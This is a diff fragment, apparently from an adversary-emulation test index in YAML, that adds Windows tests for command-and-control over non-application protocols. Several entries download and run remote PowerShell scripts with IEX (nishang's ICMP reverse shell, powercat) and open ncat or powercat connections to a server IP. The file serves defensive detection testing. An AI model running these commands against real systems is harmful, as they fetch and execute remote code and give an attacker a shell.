+          IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
+          Invoke-PowerShellIcmp -IPAddress #{server_ip}
+    - name: Netcat C2
+      description: "Start C2 Session Using Ncat\nTo start the listener on a Linux
+        device, type the following: \nnc -l -p <port>\n"
+      supported_platforms:
+      - windows
+      dependency_executor_name: PowerShell
+      dependencies:
+      - description: ncat.exe must be available at specified location (#{ncat_exe})
+        prereq_command: if( Test-Path "#{ncat_exe}") {exit 0} else {exit 1}
+        get_prereq_command: |-
+          $parentpath = Split-Path (Split-Path "#{ncat_exe}"); $zippath = "$parentpath\nmap.zip"
+          Invoke-WebRequest  "https://nmap.org/dist/nmap-7.80-win32.zip" -OutFile "$zippath"
+          Expand-Archive $zippath $parentpath -Force
+          $unzipPath = Join-Path $parentPath "nmap-7.80"
+          if( $null -eq (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | ?{$_.DisplayName -like "Microsoft Visual C++*"}) ) {
+            Start-Process (Join-Path $unzipPath "vcredist_x86.exe")
+          }
+      input_arguments:
+        server_ip:
+          description: The IP address or domain name of the listening server
+          type: string
+          default: 127.0.0.1
+        server_port:
+          description: The port for the C2 connection
+          type: integer
+          default: 80
+        ncat_exe:
+          description: The location of ncat.exe
+          type: path
+          default: "$env:TEMP\\T1095\\nmap-7.80\\ncat.exe"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'cmd /c #{ncat_exe} #{server_ip} #{server_port}
+
+'
+    - name: Powercat C2
+      description: "Start C2 Session Using Powercat\nTo start the listener on a Linux
+        device, type the following: \nnc -l -p <port>\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        server_ip:
+          description: The IP address or domain name of the listening server
+          type: ip
+          default: 127.0.0.1
+        server_port:
+          description: The port for the C2 connection
+          type: port number
+          default: 80
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
+          powercat -c #{server_ip} -p #{server_port}
   T1065:
     technique:
       x_mitre_data_sources:
